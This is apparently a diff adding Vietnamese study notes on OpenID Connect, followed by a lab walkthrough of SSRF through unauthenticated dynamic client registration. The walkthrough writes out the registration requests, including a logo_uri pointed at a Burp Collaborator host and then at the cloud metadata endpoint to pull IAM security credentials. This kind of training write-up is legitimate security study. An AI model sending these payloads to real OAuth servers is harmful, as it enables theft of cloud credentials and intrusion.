@@ -712,13 +712,241 @@ Khi thực hiện lướt web, chúng ta gần như chắc chắn đã bắt g�
 
   → Kết quả ta đã thực hiện API call thành công để lấy dữ liệu của nạn nhân, bao gồm cả khóa API của họ.
 
+---
+
+## 6. OPENID Connect
+
+### 6.1. OPENID là gì?
+
+- OpenID Connect mở rộng giao thức OAuth để cung cấp một lớp nhận dạng và xác thực chuyên dụng nằm trên nền tảng triển khai cơ bản của OAuth. Nó thêm một số chức năng đơn giản giúp hỗ trợ tốt hơn cho kịch bản xác thực của OAuth.
+
+- Để hỗ trợ OAuth đúng cách, client application sẽ phải cấu hình các cơ chế OAuth riêng biệt cho mỗi nhà cung cấp, mỗi cái có các endpoints khác nhau, scope riêng và nhiều thứ khác nữa.
+
+- OpenID Connect giải quyết nhiều vấn đề này bằng cách thêm các tính năng liên quan đến danh tính theo tiêu chuẩn để làm cho việc xác thực qua OAuth hoạt động một cách đáng tin cậy và đồng nhất hơn.
+
+### 6.2. How does OpenID Connect work?
+
+- OpenID Connect gắn kết một cách hợp lý vào các luồng OAuth thông thường.
+
+- Từ khía cạnh của ứng dụng khách, sự khác biệt chính là có một tập hợp các scope đã chuẩn hóa bổ sung giống nhau cho tất cả các nhà cung cấp, và một loại phản hồi bổ sung: *id_token*.
+
+- **OpenID Connect roles:**
+
+  - Về cơ bản giống với OAuth tiêu chuẩn. Sự khác biệt chính là phần thông số sử dụng thuật ngữ hơi khác:
+ 
+    - Relying party: là ứng dụng đang yêu cầu xác thực người dùng, giống như là client application bên OAuth.
+   
+    - End user: là user đang được xác thực, giống với resourse owner bên OAuth.
+   
+    - OpenID provider: là một địch vụ của OAuth được cấu hình để hỗ trợ OpenID Connect.
+   
+- **OpenID Connect claims and scopes:**
+
+  - Thuật ngữ "claims" đề cập đến các key:value đại diện cho thông tin về user trên máy chủ tài nguyên. Một ví dụ về một claim có thể là "family_name":"Tai".
+ 
+  - Khác với OAuth basic, có scope riêng cho từng nhà cung cấp, tất cả các dịch vụ OpenID Connect đều sử dụng một tập các scope giống nhau. Để sử dụng OpenID Connect,        client application phải chỉ định scope *openid* trong yêu cầu ủy quyền. Chúng sau đó có thể bao gồm một hoặc nhiều scope tiêu chuẩn khác như:
+ 
+    - pprofile
+
+    - email
+
+    - address
+
+    - phone
+   
+  - Mỗi scope này tương ứng với quyền truy cập đọc cho một tập con các claim về người dùng được định nghĩa trong quy định OpenID.
+  
+  - Ví dụ, yêu cầu scope openid profile sẽ cấp quyền truy cập đọc cho client application đến một loạt các claim liên quan đến danh tính của người dùng, chẳng hạn như         family_name, given_name, birth_date, và các thông tin khác.
+
+- **ID token:**
+
+  - Phần bổ sung chính khác được cung cấp bởi OpenID Connect là response type id_token.
+  
+  - Cái này trả về một JSON web token (JWT) được ký bằng JSON web signature (JWS). Nội dung của JWT chứa một danh sách các claim dựa trên scope mà đã được yêu cầu ban        đầu. Nó cũng chứa thông tin về cách và khi nào người dùng đã được xác thực lần cuối bởi dịch vụ OAuth. Client application có thể sử dụng điều này để quyết định liệu      người dùng đã được xác thực đủ hay chưa.
+ 
+  - Lợi ích chính của việc sử dụng id_token là giảm số lượng yêu cầu cần phải gửi giữa ứng dụng khách và dịch vụ OAuth. Thay vì phải lấy access token và sau đó yêu cầu       dữ liệu người dùng riêng biệt, ID token chứa dữ liệu này sẽ được gửi ngay cho ứng dụng khách ngay sau khi người dùng xác thực.
+ 
+  - Lưu ý rằng nhiều response types được hỗ trợ bởi OAuth, vì vậy việc một ứng dụng khách gửi yêu cầu ủy quyền với cả response type của OAuth cơ bản và id_token của          OpenID Connect là hoàn toàn chấp nhận được:
+ 
+    - *response_type=id_token token*
+    - *response_type=id_token code*
+
+  - Trong trường hợp này, cả một ID token và mã code hoặc access token sẽ được gửi đến ứng dụng khách cùng một lúc.
+ 
+### 6.3. Identifying OpenID Connect
+
+- Cách chắc chắn nhất để kiểm tra OpenID Connect đang được ứng dụng khách sử dụng là tìm kiếm scope openid bắt buộc.
+
+- Để xem dịch vụ OAuth có hỗ trợ OpenID Connect hay không, ta có thể thử thêm scope openid hoặc thay đổi response type thành id_token và quan sát xem điều này có gây ra lỗi hay không.
+
+- Cũng là một ý tưởng hay nếu xem qua tài liệu của nhà cung cấp OAuth để xem có thông tin hữu ích nào về hỗ trợ OpenID Connect của họ không. Ta cũng có thể truy cập tệp    cấu hình từ endpoint chuẩn */.well-known/openid-configuration*.
+
+### 6.4. OpenID Connect vulnerabilities
+
+- Vì đây chỉ là một lớp nằm trên OAuth, ứng dụng khách hoặc dịch vụ OAuth vẫn có thể bị tổn thương trước một số cuộc tấn công dựa trên OAuth mà chúng ta đã xem xét trước đó.
+
+- Dưới đây là loại lỗ hổng của OpenID Connect.
+
+### Unprotected dynamic client registration
+
+- Nếu việc đăng ký client động (dynamic client registration - là quá trình đăng ký một client application, trước khi user có thể dùng OAuth login, ứng dụng (client) phải được đăng ký trước với OAuth server) được hỗ trợ, ứng dụng khách có thể tự đăng ký bằng cách gửi một yêu cầu POST đến endpoint */registration*.
+
+- Trong phần body của yêu cầu, client application gửi thông tin chính về bản thân dưới định dạng JSON. Ví dụ, thường sẽ yêu cầu bao gồm một dãy các URI chuyển hướng đã được phê duyệt.
+
+- Nó cũng có thể gửi một loạt thông tin bổ sung, chẳng hạn như tên của các endpoints mà họ muốn công khai, tên cho ứng dụng của họ, ... Một yêu cầu đăng ký điển hình có thể trông như thế này:
+
+  ```http
+  POST /openid/register HTTP/1.1
+  Content-Type: application/json
+  Accept: application/json
+  Host: oauth-authorization-server.com
+  Authorization: Bearer ab12cd34ef56gh89
+  
+  {
+      "application_type": "web",
+      "redirect_uris": [
+          "https://client-app.com/callback",
+          "https://client-app.com/callback2"
+          ],
+      "client_name": "My Application",
+      "logo_uri": "https://client-app.com/logo.png",
+      "token_endpoint_auth_method": "client_secret_basic",
+      "jwks_uri": "https://client-app.com/my_public_keys.jwks",
+      "userinfo_encrypted_response_alg": "RSA1_5",
+      "userinfo_encrypted_response_enc": "A128CBC-HS256",
+      …
+  }
+  ```
+
+- Nhà cung cấp OpenID nên yêu cầu client app xác thực chính nó.
+
+- Trong ví dụ trên, họ đang sử dụng một HTTP bearer token. Tuy nhiên, một số nhà cung cấp sẽ cho phép đăng ký khách động (dynamic client registration) mà không cần xác thực, điều này có thể cho phép một kẻ tấn công đăng ký client app độc hại của riêng họ.
+
+- Điều này có thể có nhiều hậu quả khác nhau tùy thuộc vào cách các giá trị của những thuộc tính có thể bị kẻ tấn công kiểm soát được sử dụng.
+
+- Ví dụ, bạn có thể đã nhận thấy rằng một số thuộc tính này có thể được cung cấp dưới dạng một URI. Nếu bất kỳ URI nào trong số này được nhà cung cấp OpenID truy cập, điều này có thể dẫn đến lỗ hổng SSRF thứ cấp trừ khi các biện pháp bảo mật bổ sung được thực hiện.
+
+### Lab: SSRF via OpenID dynamic client registration
+
+- Mô tả: Lab này cho phép các ứng dụng khách đăng ký một cách động với dịch vụ OAuth qua một endpoint registration chuyên biệt. Một số dữ liệu cụ thể của khách hàng được sử dụng một cách không an toàn bởi dịch vụ OAuth, điều này mở ra một vector tiềm ẩn cho SSRF.
+
+- Cách solve: Sử dụng SSRF truy cập *http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/*
+
+- Giao diện trang web ta thực hiện khai thác:
+
+  <img width="1919" height="948" alt="image" src="https://github.com/user-attachments/assets/ea26eab2-a520-44c0-8c72-4ee6e4ded936" />
+
+- Tương tự như những bài lab trước, cho phép thực hiện đăng nhập liên kết với social media.
+
+- Truy cập đường dẫn dưới để xem và truy cập file cấu hình:
+
+  ```url
+  https://oauth-0a0d002504d5131280f2152c0268007d.oauth-server.net/.well-known/openid-configuration
+  ```
+
+  Chú ý nhận thấy rằng, client registration endpoint được đặt tại */reg*.
+
+  <img width="1919" height="875" alt="image" src="https://github.com/user-attachments/assets/6ba1d000-643e-46db-95c2-526b64323ca1" />
+
+- Trong Burp Repeater, tạo một yêu cầu POST phù hợp để đăng ký ứng dụng khách của riêng mình với dịch vụ OAuth, trong đó ít nhất *redirect_uris* chứa một mảng whitelist tùy ý URI callback:
+
+  ```
+  POST /reg HTTP/1.1
+  Host: oauth-0a0d002504d5131280f2152c0268007d.oauth-server.net
+  Content-Type: application/json
+  
+  {
+      "redirect_uris" : [
+          "https://example.com"
+      ]
+  }
+  ```
+
+- Gửi request. Thấy rằng ta đã đăng ký client app của riêng mình một cách thành công mà không cần bất kỳ xác thực nào. Phản hồi chứa nhiều metadata liên quan đến client app mới của mình, bao gồm một client_id mới:
+
+  <img width="1870" height="853" alt="image" src="https://github.com/user-attachments/assets/bed557eb-3335-4496-a39f-95371d8aae72" />
+
+- Sử dụng Burp, kiểm tra luồng OAuth và nhận thấy rằng trang "Authorize", hiển thị logo của ứng dụng khách. Logo này được lấy từ */client/CLIENT-ID/logo*. Chúng ta biết từ thông số OpenID rằng các ứng dụng khách có thể cung cấp URL cho logo của họ thông qua thuộc tính logo_uri trong quá trình đăng ký động.
+
+  <img width="1863" height="575" alt="image" src="https://github.com/user-attachments/assets/3d041d06-11d5-4d09-973e-092df1b34933" />
+
+- Gửi request GET /client/CLIENT-ID/logo đến Burp Repeater.
+
+- Trong Repeater, tại POST /reg request. Thêm thuộc tính logo_uri với giá trị là URL của Burp Collaborator:
+
+  ```
+  POST /reg HTTP/2
+  Host: oauth-0a0d002504d5131280f2152c0268007d.oauth-server.net
+  Content-Type: application/json
+    
+  { 
+       "redirect_uris" : [
+  					"https://example.com"
+       ],
+      	"logo_uri" : "https://hpaxlw1koa4dajuvozt5af4ei5owcn0c.oastify.com"
+  }
+  ```
+
+- Gửi request:
+
+  <img width="1865" height="790" alt="image" src="https://github.com/user-attachments/assets/9f23dbd1-de52-41b4-aaae-8af0889f64e6" />
+
+  &rarr; Chú ý *client_id: MTmNd--8X6B8R1DfN6EgU*
+
+- Trong request *GET /client/CLIENT-ID/logo*, ta thay CLIENT-ID là giá trị ta vừa mới có ở trên và gửi request:
+
+  <img width="1919" height="835" alt="image" src="https://github.com/user-attachments/assets/0ec24cf8-914b-4e1c-903c-4e37c6ba83f8" />
+
+- Kiểm tra Burp Collaborator, nhận thấy rằng có một HTTP interaction đang cố gắng lấy logo không tồn tại của ta. Điều này xác nhận rằng ta có thể sử dụng thuộc tính logo_uri để kích thích yêu cầu từ máy chủ OAuth.
+
+  <img width="1919" height="897" alt="image" src="https://github.com/user-attachments/assets/264c9a7b-db8a-41e6-92b0-ac4f25cc27fc" />
+
+- Quay lại request POST /reg và thay giá trị logo_uri với target URL như dưới và gửi request:
+
+  ```
+  "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+  ```
+
+  <img width="1869" height="847" alt="image" src="https://github.com/user-attachments/assets/4ea720c3-b36c-4f47-afc9-bf3f8763e364" />
+
+- Tương tự, lấy giá trị client_id mới và thay thế vào trong request *GET /client/CLIENT-ID/logo* và tiếp tục gửi đi request:
+
+  <img width="1918" height="846" alt="image" src="https://github.com/user-attachments/assets/62d708b9-37a2-4ea7-a502-d4e52729787f" />
+
+  &rarr; Ta thấy rằng phản hồi chứa metadata nhạy cảm cho môi trường đám mây của nhà cung cấp OAuth, bao gồm khóa truy cập bí mật.
+
+
+**NOTE:**
+
+- DCR = một cơ chế để ứng dụng client tự động đăng ký với OAuth server (thay vì dev phải vào console làm thủ công).
+
+- Ví du: Bạn là user → bạn có Gmail account (user@example.com). Viết app tên là “NoteApp”. Muốn cho user đăng nhập bằng Google → mình phải đăng ký NoteApp với Google OAuth server. Kết quả, Google cấp cho NoteApp:
+
+  ```json
+  {
+  "client_id": "123-abc.apps.googleusercontent.com",
+  "client_secret": "xyzSECRET",
+  "redirect_uris": ["https://noteapp.com/callback"]
+  }
+  ```
+
+- Sau đó user (bạn) mới có thể dùng Gmail account để login vào NoteApp qua OAuth flow.
+
+- *client_id* và *client_secret* là của app (client application), không phải của từng user. *client_id* = định danh công khai của ứng dụng, *client_secret* = giống như password của ứng dụng, để chứng minh app đó “chính chủ” khi nói chuyện với OAuth server.
+
+
 
   
 
+
+  
+
+
   
 
 
 
+  
 
 
 
